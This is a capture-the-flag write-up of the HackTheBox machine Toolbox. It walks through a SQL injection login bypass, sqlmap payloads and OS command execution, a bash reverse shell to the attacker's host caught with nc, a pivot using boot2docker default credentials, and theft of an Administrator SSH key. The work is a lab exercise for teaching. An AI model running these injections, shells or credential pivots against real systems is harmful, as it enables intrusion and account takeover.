---
title: HTB: Toolbox
url: https://0xdf.gitlab.io/2021/04/27/htb-toolbox.html
date: 2021-04-27T09:00:00+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, htb-toolbox, ctf, nmap, windows, wfuzz, docker-toolbox, sqli, injection, postgresql, sqlmap, default-creds, docker, container
---

![Toolbox](https://0xdfimages.gitlab.io/img/toolbox-cover.png)

Toolbox is a machine that released directly into retired as a part of the Containers and Pivoting Track on HackTheBox. It’s a Windows instance running an older tech stack, Docker Toolbox. Before Windows could support containers, this used VirtualBox to run a lightweight custom Linux OS optimized for running Docker. I’ll get a foodhold using SQL injection which converts into RCE with sqlmap. Then I’ll use default credentials to pivot into the VM, where I find an SSH key that gives administrator access to the host system.

## Box Info

| Name | [Toolbox](https://hackthebox.com/machines/toolbox)  [Toolbox](https://hackthebox.com/machines/toolbox) [Play on HackTheBox](https://hackthebox.com/machines/toolbox) |
| --- | --- |
| Release Date | 12 Apr 2021 |
| Retire Date | 12 Apr 2021 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308) |

## Recon

### nmap

`nmap` found many open TCP ports, including FTP (21), SSH (22), RPC (135), Netbios (139), SMB (445), HTTPS (443), and WinRM (5985):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.236
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 13:18 EDT
Warning: 10.10.10.236 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.236
Host is up (0.033s latency).
Not shown: 64872 closed ports, 649 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.03 seconds

oxdf@parrot$ nmap -p 21,22,135,139,443,445,5985 -sCV -oA scans/nmap-tcpscripts 10.10.10.236
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 13:19 EDT
Nmap scan report for 10.10.10.236
Host is up (0.019s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https         Apache/2.4.38 (Debian)
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m48s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-23T17:23:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds

```

The OpenSSH banner suggests the OS is Windows 7.

There’s a certificate on 443 with the domain name `admin.megalogistic.com`.

Anonymous login is allowed on FTP.

### Fuzz for VHosts

Given the existence of `admin.megalogistic.com`, I’ll fuzz to see if any other virtual hosts display something different, but didn’t find anything besides admin:

```

oxdf@parrot$ wfuzz -u https://10.10.10.236 -H "Host: FUZZ.megalogistic.com" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 22357
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.236/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000036:   200        35 L     83 W       889 Ch      "admin"
000037212:   400        12 L     53 W       424 Ch      "*"

Total time: 1408.239
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 71.01062

```

### FTP - TCP 21

As `nmap` noted, anonymous login is available for FTP. I’ll give it the username anonymous and a blank password:

```

foxdf@parrot$ ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:oxdf): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> 

```

There’s a single file available, `docker-toolbox.exe`:

```

ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"

```

[Docker Toolbox](https://docs.bitnami.com/containers/how-to/install-docker-in-windows/) is an older solution for running Docker in Windows, before Windows had native Docker support. It basically ran a VirtualBox Linux VM that runs Docker and its containers.

I don’t need a copy of the `exe` at this point, but fair to assume this is a hint for later.

### SMB - TCP 445

Anonymous access is not permitted to SMB:

```

oxdf@parrot$ smbclient -N -L //10.10.10.236
session setup failed: NT_STATUS_ACCESS_DENIED

```

### megalogistic.com - TCP 443

The site is for a shipping / logistics company:

[![image-20210423133835528](https://0xdfimages.gitlab.io/img/image-20210423133835528.png)](https://0xdfimages.gitlab.io/img/image-20210423133835528.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210423133835528.png)

Most of the site is just lorem ipsum text (filler), and the forms don’t seem to submit anywhere. I could make a list of potential usernames from `about.html`, but it’s just names without emails, so I’ll look elsewhere first.

All the pages look static at this point.

### admin.megalogistic.com

This page presents a login form:

![image-20210423134557144](https://0xdfimages.gitlab.io/img/image-20210423134557144.png)

The “Forgot Password?” link doesn’t lead anywhere. A guess of admin/admin returns a message that “Login failed”.

## Shell as postgres in container

### Identify SQL Injection

If I try to login with password `'`, the page return the form, with an error message in the background at the top:

![image-20210423134818697](https://0xdfimages.gitlab.io/img/image-20210423134818697.png)

The message reads:

> **Warning**: pg\_query(): Query failed: ERROR: unterminated quoted string at or near “’’’);” LINE 1: …FROM users WHERE username = ‘admin’ AND password = md5(‘’’); ^ in **/var/www/admin/index.php** on line **10**
>
> **Warning**: pg\_num\_rows() expects parameter 1 to be resource, bool given in **/var/www/admin/index.php** on line **11**

There are multiple things to learn from this:
1. The form is likely vulnerable to SQL injection.
2. The error is from `pg_query()`, which suggests the backend database is PostgreSQL.
3. The passwords are stored using MD5 hashes.

### Bypass Login

From the error above, I can guess that the SQL query being run looks like:

```

SELECT * FROM users WHERE username = '{input user}' AND password = md5('{input password}');

```

Then the site likely checks if there are results to determine if access should be allowed.

If I submit the username `' or 1=1-- -`, then the query will be:

```

SELECT * FROM users WHERE username = '' or 1=1-- -'' AND password = md5('anything');

```

Because `-- -` makes anything after a comment, this will return all users, and hopefully let me in.

![image-20210423135419308](https://0xdfimages.gitlab.io/img/image-20210423135419308.png)

On submitting:

![image-20210423135504188](https://0xdfimages.gitlab.io/img/image-20210423135504188.png)

I’m at the admin dashboard, but it doesn’t do much.

### Enumerate DB

A login form isn’t displaying data from the DB back to the page, so it’s a more difficult blind injection. For an easy-rated box like Toolbox, I’ll turn to `sqlmap`. I’ll save a POST request for login from Burp to a file with right-click, “Copy to file”. It’s important that this request not have any injections in it, or `sqlmap` will yell.

I’ll run with `-r login.request` to give it the file to work from, `--force-ssl` (as that’s where the site is), and `--batch` to accept the defaults at the prompts. It finds four injections:

```

oxdf@parrot$ sqlmap -r login.request --force-ssl --batch
...[snip]...
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=admin' AND (SELECT (CASE WHEN (1539=1539) THEN NULL ELSE CAST((CHR(116)||CHR(65)||CHR(89)||CHR(71)) AS NUMERIC) END)) IS NULL AND 'ITbh'='ITbh&password=admin

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin' AND 1461=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (1461=1461) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC) AND 'ZWWH'='ZWWH&password=admin

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin';SELECT PG_SLEEP(5)--&password=admin

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin' AND 4799=(SELECT 4799 FROM PG_SLEEP(5)) AND 'Cmys'='Cmys&password=admin
---
[14:00:35] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
...[snip]...

```

I’ll add `--dbs` to the end of the command and run it again to list the dbs:

```

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

```

`sqlmap -r login.request --force-ssl --batch -D public --tables` will list the tables in public, finding one:

```

Database: public
[1 table]
+-------+
| users |
+-------+

```

`sqlmap -r login.request --force-ssl --batch -D public -T users --dump` will dump a single user, admin, and their password hash. `sqlmap` tries to crack it but fails, and Google doesn’t know it either.

```

[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+

```

The other two tables aren’t interesting.

### Commands via SQL

One technique that rarely works, but is always worth trying is the `--os-cmd` flag in `sqlmap`. From [the docs](https://github.com/sqlmapproject/sqlmap/wiki/Usage#run-arbitrary-operating-system-command), for PostgreSQL, it will upload a shared library to the system that will work with the database and run arbitrary commands on the system.

I’ll try `whoami` since it will work on either Linux or Windows, and it works:

```

oxdf@parrot$ sqlmap -r login.request --force-ssl --batch --os-cmd whoami
...[snip]...
[14:09:32] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[14:09:32] [INFO] fingerprinting the back-end DBMS operating system
[14:09:33] [INFO] the back-end DBMS operating system is Linux
[14:09:33] [INFO] testing if current user is DBA
[14:09:34] [INFO] retrieved: '1'
do you want to retrieve the command standard output? [Y/n/a] Y
[14:09:35] [INFO] retrieved: 'postgres'

```

The previous command identified the OS as Debian 10. Given this is a Windows host according to HTB, this must be in a Docker container. The `id` command returns as well:

```

[14:10:45] [INFO] retrieved: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'

```

The `--os-shell` flag will drop into an interactive prompt to run more than one command as well:

```

oxdf@parrot$ sqlmap -r login.request --force-ssl --batch --os-shell
...[snip]...
[14:14:14] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>

```

### Shell

I’ll start `nc` and give `sqlmap` a Bash reverse shell to see if it works:

```

os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.14/443 0>&1"
do you want to retrieve the command standard output? [Y/n/a] Y

```

It hangs here, but at `nc` there’s a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.236] 51238
bash: cannot set terminal process group (1008): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$

```

Legacy Python is not installed, but Python3 is:

```

postgres@bc56e3cc55e9:/$ python -V
python -V
bash: python: command not found
postgres@bc56e3cc55e9:/$ python3 -V
python3 -V
Python 3.7.3

```

I’ll upgrade my shell using the standard trick:

```

postgres@bc56e3cc55e9:/$ python3 -c 'import pty;pty.spawn("bash")'
postgres@bc56e3cc55e9:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
postgres@bc56e3cc55e9:/$ 

```

This is important as I can’t do the next steps without a full TTY.

There’s also a `user.txt` in postgres’ home directory (not sure why it says `flag.txt` in the file, but the hash works):

```

postgres@bc56e3cc55e9:/$ cd ~
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
f0183e44************************
flag.txt

```

## Shell as docker/root in VM

### Enumeration

I’m definitely not on the host machine now. `ifconfig` shows the IP 172.17.0.2:

```

postgres@bc56e3cc55e9:/$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 1027867  bytes 76048369 (72.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 724411  bytes 2316376591 (2.1 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

The file system is quite empty.

### Docker-Toolbox

At this point, a bit more detail about Docker-Toolbox is necessary. The solution is deprecated, but that doesn’t mean it can’t be seen in the wild. Docker Toolbox installs VirtualBox, and creates a VM running the [boot2docker](https://github.com/boot2docker/boot2docker#ssh-into-vm) Linux distribution. From it’s README:

> Boot2Docker is a lightweight Linux distribution made specifically to run [Docker](https://www.docker.com/) containers. It runs completely from RAM, is a ~45MB download and boots quickly.

At the bottom of that page, there’s information on how to SSH into the VM using the username docker and the password tcuser. I considered doing a `ping` sweep of the network to look for other hosts, but `ping` isn’t installed on this container.

I can guess that since this container is .2, the host (VM) is likely .1, and try to ssh into it. It works:

```

postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$

```

### sudo

This user has full `sudo` with no password:

```

docker@box:~$ sudo -l                                                          
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL

```

I’ll take a `root` shell:

```

docker@box:~$ sudo su                                                          
root@box:/home/docker#

```

## Shell as root

### Enumeration

There’s nothing interesting in any of the homedirs on this VM. This is, as I suspected, boot2docker:

```

root@box:/# cat /etc/os-release                                  
NAME=Boot2Docker
VERSION=19.03.5
ID=boot2docker
ID_LIKE=tcl
VERSION_ID=19.03.5
PRETTY_NAME="Boot2Docker 19.03.5 (TCL 10.1)"
ANSI_COLOR="1;34"
HOME_URL="https://github.com/boot2docker/boot2docker"
SUPPORT_URL="https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/"
BUG_REPORT_URL="https://github.com/boot2docker/boot2docker/issues"

```

There’s an interesting folder at the system root, `c`:

```

root@box:/# ls                                                                 
bin           home          linuxrc       root          sys
c             init          mnt           run           tmp
dev           lib           opt           sbin          usr
etc           lib64         proc          squashfs.tgz  var

```

It looks like it has mounted the `Users` directory, which is standard in a Windows system:

```

root@box:/c# ls                                                                
Users
root@box:/c# cd Users/                                                         
root@box:/c/Users# ls                                                          
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony

```

In the Administrator’s folder, in addition to a bunch of typical Windows stuff, there’s a `.ssh` directory:

```

root@box:/c/Users/Administrator# ls -la                                        
total 1581
drwxrwxrwx    1 docker   staff         8192 Feb  8 06:08 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 Apr 23 18:32 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .ssh
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
...[snip]...

```

While this is typically thought of as a Linux thing, Windows with SSH can have this as well to allow for key-based auth and other standard SSH needs. There is a key inside:

```

root@box:/c/Users/Administrator/.ssh# ls                                       
authorized_keys  id_rsa           id_rsa.pub       known_hosts

```

The public key here is in `authorized_keys`, as this returns nothing:

```

root@box:/c/Users/Administrator/.ssh# diff id_rsa.pub authorized_keys

```

`ssh-keygen -y -e -f keyfile` will return the public key for the key, so I can use that to check if the private key here matches the public (and the one in `authorized_key`):

```

root@box:/c/Users/Administrator/.ssh# ssh-keygen -y -e -f id_rsa      
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "2048-bit RSA, converted by root@box from OpenSSH"
AAAAB3NzaC1yc2EAAAADAQABAAABAQC+jhIuWD92RK0DiMNQ3GAXyRs0AX7ohgs044J6ml
+PPpFI5C8x3TxpsbKeEozOyKJUJ4miP0vwZ9JcZkh+wAhZef2fI1oN0CmgXsx+bUoi2A75
b2YzuUCuzjOAHMwZCV4iyRC9ZNwqtA10IOP0nE0huFguEleCuj67l1boRxjOrYxI5GbsD5
5d+Y+92viETTA1QjDHag4+vZ24F+bG6EvyZlBa7lTX4il7Y2/h8BRiEoZNYePihyNTAb1d
xTSIjilwdPedc8qYaOg/KI/OlrlZ2InxCkwTf3w2d7iafE5uhZOneMZonUa6dkLKJzSJLB
6ZwEmI3J9kKFOKlaYEwrzz
---- END SSH2 PUBLIC KEY ----
root@box:/c/Users/Administrator/.ssh# ssh-keygen -y -e -f id_rsa.pub           
---- BEGIN SSH2 PUBLIC KEY ----
Comment: "2048-bit RSA, converted by root@box from OpenSSH"
AAAAB3NzaC1yc2EAAAADAQABAAABAQC+jhIuWD92RK0DiMNQ3GAXyRs0AX7ohgs044J6ml
+PPpFI5C8x3TxpsbKeEozOyKJUJ4miP0vwZ9JcZkh+wAhZef2fI1oN0CmgXsx+bUoi2A75
b2YzuUCuzjOAHMwZCV4iyRC9ZNwqtA10IOP0nE0huFguEleCuj67l1boRxjOrYxI5GbsD5
5d+Y+92viETTA1QjDHag4+vZ24F+bG6EvyZlBa7lTX4il7Y2/h8BRiEoZNYePihyNTAb1d
xTSIjilwdPedc8qYaOg/KI/OlrlZ2InxCkwTf3w2d7iafE5uhZOneMZonUa6dkLKJzSJLB
6ZwEmI3J9kKFOKlaYEwrzz
---- END SSH2 PUBLIC KEY ----

```

They match!

### SSH

I’ll create a copy of the private key on my local VM, and set the permissions so that SSH will trust it:

```

oxdf@parrot$ vim ~/keys/toolbox-administrator
oxdf@parrot$ chmod 600 ~/keys/toolbox-administrator

```

Now I can use it to auth as administrator:

```

oxdf@parrot$ ssh -i ~/keys/toolbox-administrator administrator@10.10.10.236
Warning: Permanently added '10.10.10.236' (ECDSA) to the list of known hosts.
Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved. 

administrator@TOOLBOX C:\Users\Administrator>  

```

And get the final flag:

```

administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt
cc9a0b76************************

```